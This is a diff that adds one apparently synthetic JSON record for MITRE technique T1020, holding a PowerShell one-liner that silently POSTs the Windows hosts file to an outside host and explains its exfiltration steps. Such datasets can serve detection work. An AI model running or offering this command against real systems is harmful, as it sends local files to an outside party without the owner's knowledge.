@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1020",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$ProgressPreference='SilentlyContinue'; Invoke-WebRequest -Uri 'https://edge.examplecdn.com/submit/hosts' -Method Post -InFile 'C:\\Windows\\System32\\drivers\\etc\\hosts' -ContentType 'text/plain' -Headers @{ 'User-Agent'='Mozilla/5.0' } -ErrorAction SilentlyContinue",
+  "explanation": "Silently exfiltrates the hosts file via HTTPS POST to reveal potential redirections or tampering.",
+  "rationale_steps": [
+    "Select a small but sensitive configuration file.",
+    "Exfiltrate the file using Invoke-WebRequest POST over HTTPS.",
+    "Keep headers generic and suppress progress output."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1020-ed594729-a38a809b",
+  "source_prompt_hash": "ed594729",
+  "timestamp_utc": "2025-09-30T09:16:21.768830Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
